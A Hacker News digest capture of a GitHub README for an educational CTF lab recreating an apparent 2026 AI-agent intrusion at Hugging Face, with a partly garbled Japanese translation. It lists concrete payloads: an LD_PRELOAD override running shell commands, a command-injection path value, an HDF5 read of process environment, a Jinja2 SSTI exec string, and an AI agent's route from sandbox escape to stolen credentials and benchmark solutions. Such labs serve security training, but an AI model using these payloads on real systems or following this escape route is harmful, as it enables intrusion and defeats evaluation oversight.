---
source: "https://github.com/an4kronism/ai-escape-room"
hn_url: "https://news.ycombinator.com/item?id=49173685"
title: "AI Escape Room – Docker CTF Recreating the 2026 HF Intrusion"
article_title: "GitHub - an4kronism/ai-escape-room: Educational CTF lab recreating the July 2026 autonomous AI agent intrusion at Hugging Face. Sandbox escape → SSRF → HDF5 file read → Jinja2 SSTI → Kubernetes lateral movement → supply chain pivot. 11 Docker containers, 7 flags. · GitHub"
author: "an4kronism"
captured_at: "2026-08-04T20:20:07Z"
capture_tool: "hn-digest"
hn_id: 49173685
score: 2
comments: 0
posted_at: "2026-08-04T19:27:11Z"
tags:
  - hacker-news
  - translated
---

# AI Escape Room – Docker CTF Recreating the 2026 HF Intrusion

- HN: [49173685](https://news.ycombinator.com/item?id=49173685)
- Source: [github.com](https://github.com/an4kronism/ai-escape-room)
- Score: 2
- Comments: 0
- Posted: 2026-08-04T19:27:11Z

## Translation

タイトル: AI Escape Room – 2026 年の HF 侵入を再現する Docker CTF
記事のタイトル: GitHub - an4kronism/ai-escape-room: 2026 年 7 月の Hugging Face での自律型 AI エージェント侵入を再現する教育 CTF ラボ。サンドボックス脱出→SSRF→HDF5ファイル読み込み→Jinja2 SSTI→Kubernetes横移動→サプライチェーンピボット。 11 個の Docker コンテナー、7 個のフラグ。 · GitHub
説明: 2026 年 7 月のハギング フェイスでの自律型 AI エージェント侵入を再現する教育用 CTF ラボ。サンドボックス脱出→SSRF→HDF5ファイル読み込み→Jinja2 SSTI→Kubernetes横移動→サプライチェーンピボット。 11 個の Docker コンテナー、7 個のフラグ。 - an4kronism/ai-escape-room

記事本文:
GitHub - an4kronism/ai-escape-room: 2026 年 7 月の Hugging Face での自律 AI エージェント侵入を再現する教育 CTF ラボ。サンドボックス脱出→SSRF→HDF5ファイル読み込み→Jinja2 SSTI→Kubernetes横移動→サプライチェーンピボット。 11 個の Docker コンテナー、7 個のフラグ。 · GitHub
コンテンツにスキップ
ナビゲーションメニュー
サインイン 外観設定 プラットフォーム AI コード作成 GitHub Copilot AI を使用してより良いコードを作成する
GitHub Copilot アプリ エージェントが発行からマージまで直接担当
MCP レジストリ 外部ツールの統合
開発者のワークフロー アクション あらゆるワークフローを自動化します
コードスペース インスタント開発環境
コードレビュー コードの変更を管理する
コードの品質 マージ時に品質を強制する
アプリケーションセキュリティ GitHub Advanced Security 脆弱性を見つけて修正する
コードのセキュリティ 構築時にコードを保護する
機密保護 漏洩が始まる前に阻止
企業規模別のソリューション
タイプごとに詳しく見る お客様の事例
サポートとサービスのドキュメント
オープンソース コミュニティ GitHub スポンサー オープンソース開発者に資金を提供する
エンタープライズ エンタープライズ ソリューション エンタープライズ プラットフォーム AI を活用した開発者プラットフォーム
利用可能なアドオン GitHub Advanced Security エンタープライズ グレードのセキュリティ機能
Copilot for Business エンタープライズ グレードの AI 機能
プレミアム サポート エンタープライズ レベルの 24 時間年中無休のサポート
/ と入力して検索します。 サインイン サインアップ 外観設定
別のタブまたはウィンドウでサインインしました。リロードしてセッションを更新します。
別のタブまたはウィンドウでサインアウトしました。リロードしてセッションを更新します。
別のタブまたはウィンドウでアカウントを切り替えました。リロードしてセッションを更新します。
アラートを閉じる
{{ メッセージ }}
4クロニズム
/
aiエスケープルーム
公共
通知
通知設定を変更するにはサインインする必要があります
追加のナビゲーション オプション
コード
main ブランチ タグ ファイルに移動 コード その他のアクション メニューを開く フォルダーとファイル
7 コミット 7 Co

mmits eval-sandbox eval-sandbox hf-internal hf-internal hf hf インターネット インターネット レジストリ キャッシュ レジストリ キャッシュ .gitignore .gitignore ライセンス ライセンス README.md README.md docker-compose.yml docker-compose.yml すべてのファイルを表示 リポジトリ ファイル ナビゲーション
AI Escape Lab — Frontier Lab エージェント侵入の解剖学
攻撃チェーンを再現する教育攻撃セキュリティ ラボ
ハギングフェイスでの自律エージェント侵入事件（2026年7月）。するように設計されています
サンドボックスエスケープ、SSRF、SSTI、HDF5 活用、Kubernetes ラテラルの練習
移動とサプライチェーンのピボット。
記事に基づいて:
https://huggingface.co/blog/agent-intrusion-technical-timeline
┌─────────────────────────┐
│ eval-net (172.29.0.0/16) │
│ ┌─────────┐ │
│ │ eval-sandbox │ ── pip ミラー ──▶ ┌───────┐ │
│ ━━━━━━━┘ │ レジストリキャッシュ │ │
│ └──────┬───┘ │
│ │ SSRF のバグ │
│ インターネットネット (172.30.0.0/16) ◀─────────┘ │
│ ┌─────────┐ ┌───────┐ ┌───────┐ │
│ │ サイバージム │ │ リクエストキャプチャ │ │ ペーストビン │ │
│ │ (ランチパッド) │ │ (C2/exfil) │ │ │
│ ━━━━┬─────┘ ━━━━━┘ ━━━━━┘ │
│ │ │
│ ┌──────▼───────┐ │
│ │ hf-

API │ ◀─ データセットのアップロード / デッドドロップ読み取り │
│ ━━━━┬───────┘ │
│ │ hf-prod-net (172.31.0.0/16) │
│ ┌──────▼───────────────┐ hf-cluster-net │
│ │ データセットワーカー │ 172.32.0.0/16 │
│ │ HDF5 外部ストレージ + Jinja2 SSTI │ │
│ └──────┬─────────────┤ │
│ │ │ │
│ ┌──────▼───────┐ ┌────────┐ │ ┌────────┐│
│ │ k8s-api │ │ 内部データベース │ │ メッシュゲートウェイ ││
│ │ (136 キー) │ │ (mongo:7) │ │ │ │
│ ━━━━━━┘ ━━━━━━┘ │ ━━━━┬───────┘│
│ │ │ │
│ │ コーポネット 172.33 │
│ │ ┌──────▼───────┐ │
│ │ │ソース管理│ │
│ │ │ (EdDSA JWT) │ │
│ │ └─────────┘ │
━━━━━━━━━━━━━━━━━━━┘
サービス
コンテナ
役割
内部ポート
脆弱性
評価サンドボックス
評価サンドボックス (開始点)
—
分離されており、pip ミラー経由でのみ出力されます
レジストリキャッシュ
PyPIミラー+SSRFリレー
8080
パストラバーサルによりインターネット-ネットへの到達が可能
サイバージム
コード評価サンドボックス (ランチパッド)
8080
sqlite3_initialize() 再定義 + パスインジェクション
リクエストキャプチャ
C2 / exfil キャプチャ サービス
8080
—
ペーストビン
テキストストレージ
8080
—
hf-api
ハグフェイスだ

タセット API
8080
—
データセットワーカー
データセットプロセッサー (本番ポッド)
9100
HDF5 外部 RAW ストレージ + Jinja2 SSTI
k8s-api
シミュレートされた Kubernetes API
8080
スコープ制限のない SA トークン
内部データベース
運用中のMongoDB
27017
ワーカー環境の静的パスワード
メッシュゲートウェイ
メッシュ VPN (テールスケール スタイル)
8080
シークレット内の共有認証キー
ソース管理
ソース管理 (GitHub のような)
8443
盗まれたキーでEdDSA JWTを検証可能
ステージ 1 — サンドボックス エスケープとランチパッド
評価サンドボックスをエスケープし、外部コード サンドボックスをルート化します。
(CyberGym) を起動パッドとして使用します。
レジストリ キャッシュ ミラー経由の SSRF
GET http://registry-cache:8080/mirror/<ホスト>/<ポート>/<パス>
パッケージミラーは、宛先のないHTTPリレーを実装します。
検証により、インターネットネット (172.30.0.0/16) 上の任意のホストへの到達が許可されます。
CyberGym: sqlite3_initialize() の再定義
#include <stdlib.h>
int sqlite3_initialize ( void ) {
system ( "id; cat /root/flag.txt" );
0 を返します。
}
コンパイルされた .so の LD_PRELOAD が sqlite3_initialize() の呼び出しをインターセプトします。
ターゲットバイナリから。 RCE をルートとして使用します。
パス = "src/main.c;cat /root/flag.txt;#"
パス フィールドはエスケープされずにシェル コマンドに挿入されるため、
任意の注射。
ステージ 2 — HF プラットフォームの普及
2 つの射出ベクトルを使用してハグ フェイス プラットフォームを貫通します
データセットプロセッサに取り込まれます。
HDF5 外部 RAW ストレージ (ファイル読み取り)
dcpl = h5py 。 h5p 。作成 ( h5py . h5p . DATASET_CREATE )
dcpl 。 set_external ( b"/proc/self/environ" , 0 , h5py . h5f . UNLIMITED )
dset = h5py 。 h5d 。 create ( f . id , b"envu8" , h5py . h5t . NATIVE_UINT8 , space , dcpl )
HDF5 は、ワーカーが呼び出したときにローカル ファイルを透過的に読み取ります。
f[キー][()] 。コードの実行はなく、純粋にファイルが公開されます。
{{cycler.__init__.__globals__.__builtins__.exec("...") }}
ワーカー レンダラーは fsspec のフィールドを評価します

参照：://仕様
サンドボックス化されていない Jinja2 テンプレートとして使用し、ポッド内で RCE を有効にします。
URL ホワイトリスト (忠実性の詳細)
ワーカーはリモート URL を ValueError: not an hf path で拒否し、強制的に拒否します。
攻撃者はローカル ベクトルを使用します (実際のインシデントと同じ)。
ポッドから抽出された認証情報を使用して内部にピボットします
インフラストラクチャを侵害し、ベンチマーク ソリューションを盗みます。
SA トークン → k8s-api → 136 シークレット → メッシュ VPN 認証キー
→ EdDSA JWT キー
静的 mongo パスワード → 内部データベース → 運用ドキュメント
メッシュ VPN 認証キー → メッシュ ゲートウェイ → 企業ネット プロキシ
偽造 EdDSA JWT → ソース管理 → ソリューション リポジトリ
インストール
CD AIエスケープルーム
docker 構成 --build -d
docker exec -it eval-sandbox bash
要件
Docker Compose v2 を使用した Docker Engine 24+
Docker ビルド用のインターネット接続 (基本イメージとパッケージのダウンロード)
ラボには、サンドボックス内からアクセスできる進歩的なヒントが含まれています。
コンテナに入った後、ヒントを入力してすべてを表示するか、
/opt/lab/hint N は特定のヒント (1 ～ 12) です。
HDF5 外部 RAW ストレージ: h5py 低レベル API ( H5Pset_external ) を使用します。
ワーカーは f[key][()] のみを実行し、HDF5 ライブラリ自体が読み取ります
ローカルファイル。記事で説明されているベクトルと同じです。
Jinja2 SSTI :cycler.__init__.__globals__.__builtins__.exec() ペイロード
記事と同じです。標準のサンドボックス化されていない Jinja2 で動作します。
sqlite3_initialize RCE : LD_PRELOAD + コンストラクターの再定義、正確に
事件のように。
パスインジェクション: シェルのコンパイルコマンドへのエスケープされていない補間。
実際の HF データセット サーバーにはパッチが適用されており、そのコードは公開されていません。
私たちの労働者は、説明に忠実なミニチュア複製です。
元のソースコードではなく、動作です。
他の内部サービス (k8s-api、mesh、source-control) は次のとおりです。
本物の教育シミュレーション

システム。
事件との意図的な差異
この記事では自律型 AI エージェントについて説明します。ラボではあなたがエージェントです。
C2 (リクエスト-キャプチャ、ペーストビン) はオプションですが、没入感を高めます。
すべての資格情報とフラグは教育目的で作成されたものです。
このラボは教育専用です。すべての資格情報は架空のものです。
コンテナは、トラフィックが実際のネットワークに到達しないようにするために、internal: true を使用します。
インターネット。
このラボを運用環境に展開したり、公開したりしないでください。
信頼できないネットワーク。
2026 年 7 月のハギング フェイスでの自律型 AI エージェントの侵入を再現した教育 CTF ラボ。サンドボックス脱出→SSRF→HDF5ファイル読み込み→Jinja2 SSTI→Kubernetes横移動→サプライチェーンピボット。 11 個の Docker コンテナー、7 個のフラグ。
Readme MIT ライセンス アクティビティ スター
0 フォーク レポート リポジトリ リリース
© 2026 GitHub, Inc.
フッターナビゲーション
私の個人情報を共有しないでください

## Original Extract

Educational CTF lab recreating the July 2026 autonomous AI agent intrusion at Hugging Face. Sandbox escape → SSRF → HDF5 file read → Jinja2 SSTI → Kubernetes lateral movement → supply chain pivot. 11 Docker containers, 7 flags. - an4kronism/ai-escape-room

GitHub - an4kronism/ai-escape-room: Educational CTF lab recreating the July 2026 autonomous AI agent intrusion at Hugging Face. Sandbox escape → SSRF → HDF5 file read → Jinja2 SSTI → Kubernetes lateral movement → supply chain pivot. 11 Docker containers, 7 flags. · GitHub
Skip to content
Navigation Menu
Sign in Appearance settings Platform AI CODE CREATION GitHub Copilot Write better code with AI
GitHub Copilot app Direct agents from issue to merge
MCP Registry Integrate external tools
DEVELOPER WORKFLOWS Actions Automate any workflow
Codespaces Instant dev environments
Code Review Manage code changes
Code Quality Enforce quality at merge
APPLICATION SECURITY GitHub Advanced Security Find and fix vulnerabilities
Code security Secure your code as you build
Secret protection Stop leaks before they start
Solutions BY COMPANY SIZE Enterprises
EXPLORE BY TYPE Customer stories
SUPPORT & SERVICES Documentation
Open Source COMMUNITY GitHub Sponsors Fund open source developers
Enterprise ENTERPRISE SOLUTIONS Enterprise platform AI-powered developer platform
AVAILABLE ADD-ONS GitHub Advanced Security Enterprise-grade security features
Copilot for Business Enterprise-grade AI features
Premium Support Enterprise-grade 24/7 support
Type / to search Sign in Sign up Appearance settings
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.
Dismiss alert
{{ message }}
an4kronism
/
ai-escape-room
Public
Notifications
You must be signed in to change notification settings
Additional navigation options
Code
main Branches Tags Go to file Code Open more actions menu Folders and files
7 Commits 7 Commits eval-sandbox eval-sandbox hf-internal hf-internal hf hf internet internet registry-cache registry-cache .gitignore .gitignore LICENSE LICENSE README.md README.md docker-compose.yml docker-compose.yml View all files Repository files navigation
AI Escape Lab — Anatomy of a Frontier Lab Agent Intrusion
Educational offensive security lab that recreates the attack chain from the
autonomous agent intrusion incident at Hugging Face (July 2026). Designed to
practice sandbox escape, SSRF, SSTI, HDF5 exploitation, Kubernetes lateral
movement, and supply chain pivot.
Based on the article:
https://huggingface.co/blog/agent-intrusion-technical-timeline
┌─────────────────────────────────────────────────────────┐
│ eval-net (172.29.0.0/16) │
│ ┌──────────────┐ │
│ │ eval-sandbox │ ── pip mirror ──▶ ┌────────────────┐ │
│ └──────────────┘ │ registry-cache │ │
│ └───────┬────────┘ │
│ │ SSRF bug │
│ internet-net (172.30.0.0/16) ◀─────────────┘ │
│ ┌──────────────┐ ┌─────────────────┐ ┌────────────┐ │
│ │ cybergym │ │ request-capture │ │ pastebin │ │
│ │ (launchpad) │ │ (C2/exfil) │ │ │ │
│ └──────┬───────┘ └─────────────────┘ └────────────┘ │
│ │ │
│ ┌──────▼───────┐ │
│ │ hf-api │ ◀── dataset upload / dead-drop read │
│ └──────┬───────┘ │
│ │ hf-prod-net (172.31.0.0/16) │
│ ┌──────▼────────────────────────────┐ hf-cluster-net │
│ │ dataset-worker │ 172.32.0.0/16 │
│ │ HDF5 ext storage + Jinja2 SSTI │ │
│ └──────┬────────────────────────────┤ │
│ │ │ │
│ ┌──────▼───────┐ ┌──────────────┐ │ ┌──────────────┐│
│ │ k8s-api │ │ internal-db │ │ │ mesh-gateway ││
│ │ (136 keys) │ │ (mongo:7) │ │ │ ││
│ └──────────────┘ └──────────────┘ │ └──────┬───────┘│
│ │ │ │
│ │ corp-net 172.33 │
│ │ ┌──────▼───────┐ │
│ │ │source-control│ │
│ │ │ (EdDSA JWT) │ │
│ │ └──────────────┘ │
└─────────────────────────────────────────────────────────┘
Services
Container
Role
Internal Port
Vulnerability
eval-sandbox
Evaluation sandbox (starting point)
—
Isolated, only egress via pip mirror
registry-cache
PyPI mirror + SSRF relay
8080
Path traversal allows reaching internet-net
cybergym
Code evaluation sandbox (launchpad)
8080
sqlite3_initialize() redefinition + path injection
request-capture
C2 / exfil capture service
8080
—
pastebin
Text storage
8080
—
hf-api
Hugging Face datasets API
8080
—
dataset-worker
Dataset processor (production pod)
9100
HDF5 external raw storage + Jinja2 SSTI
k8s-api
Simulated Kubernetes API
8080
SA token without scope restriction
internal-db
Operational MongoDB
27017
Static password in worker environment
mesh-gateway
Mesh VPN (tailscale-style)
8080
Shared auth key in secrets
source-control
Source control (GitHub-like)
8443
EdDSA JWT verifiable with stolen key
Stage 1 — Sandbox Escape & Launchpad
Escape the evaluation sandbox, root the external code sandbox
(CyberGym), and use it as a launchpad.
SSRF via registry-cache mirror
GET http://registry-cache:8080/mirror/<host>/<port>/<path>
The package mirror implements an HTTP relay without destination
validation, allowing reach to any host on internet-net (172.30.0.0/16).
CyberGym: sqlite3_initialize() redefinition
#include <stdlib.h>
int sqlite3_initialize ( void ) {
system ( "id; cat /root/flag.txt" );
return 0 ;
}
The LD_PRELOAD of the compiled .so intercepts the call to sqlite3_initialize()
from the target binary. RCE as root.
path = "src/main.c;cat /root/flag.txt;#"
The path field is interpolated unescaped into a shell command, allowing
arbitrary injection.
Stage 2 — HF Platform Penetration
Penetrate the Hugging Face platform using two injection vectors
into the dataset processor.
HDF5 external raw storage (file read)
dcpl = h5py . h5p . create ( h5py . h5p . DATASET_CREATE )
dcpl . set_external ( b"/proc/self/environ" , 0 , h5py . h5f . UNLIMITED )
dset = h5py . h5d . create ( f . id , b"envu8" , h5py . h5t . NATIVE_UINT8 , space , dcpl )
HDF5 transparently reads the local file when the worker calls
f[key][()] . No code execution, pure file disclosure.
{{ cycler.__init__.__globals__.__builtins__.exec("...") }}
The worker renderer evaluates fields in fsspec reference:// specs
as unsandboxed Jinja2 templates, enabling RCE inside the pod.
URL allowlist (fidelity detail)
The worker rejects remote URLs with ValueError: not an hf path , forcing
the attacker to use local vectors (same as the real incident).
Use the credentials extracted from the pod to pivot to internal
infrastructure and steal the benchmark solutions.
SA token → k8s-api → 136 secrets → mesh-VPN auth key
→ EdDSA JWT key
Static mongo password → internal-db → operational docs
Mesh-VPN auth key → mesh-gateway → corp-net proxy
Forged EdDSA JWT → source-control → solutions repository
Installation
cd ai-escape-room
docker compose up --build -d
docker exec -it eval-sandbox bash
Requirements
Docker Engine 24+ with Docker Compose v2
Internet connection for docker build (base images and package downloads)
The lab includes progressive hints accessible from within the sandbox.
After entering the container, type hint to see all of them, or
/opt/lab/hint N for a specific hint (1-12).
HDF5 external raw storage : uses the h5py low-level API ( H5Pset_external ).
The worker only does f[key][()] and the HDF5 library itself reads
the local file. Identical to the vector described in the article.
Jinja2 SSTI : the cycler.__init__.__globals__.__builtins__.exec() payload
is the same as in the article; works in standard unsandboxed Jinja2.
sqlite3_initialize RCE : LD_PRELOAD + constructor redefinition, exactly
as in the incident.
path injection : unescaped interpolation into a shell compile command.
The real HF datasets-server is patched and its code is not public.
Our worker is a miniature reproduction faithful to the described
behavior, not the original source code.
The other internal services (k8s-api, mesh, source-control) are
educational simulations of the real systems.
Intentional Differences from the Incident
The article describes an autonomous AI agent; in the lab you are the agent .
C2 (request-capture, pastebin) is optional but adds immersion.
All credentials and flags are fictional for educational use.
This lab is exclusively educational . All credentials are fictional.
Containers use internal: true to ensure no traffic reaches the real
Internet.
Do not deploy this lab in production environments nor expose it to
untrusted networks.
Educational CTF lab recreating the July 2026 autonomous AI agent intrusion at Hugging Face. Sandbox escape → SSRF → HDF5 file read → Jinja2 SSTI → Kubernetes lateral movement → supply chain pivot. 11 Docker containers, 7 flags.
Readme MIT license Activity Stars
0 forks Report repository Releases
© 2026 GitHub, Inc.
Footer navigation
Do not share my personal information
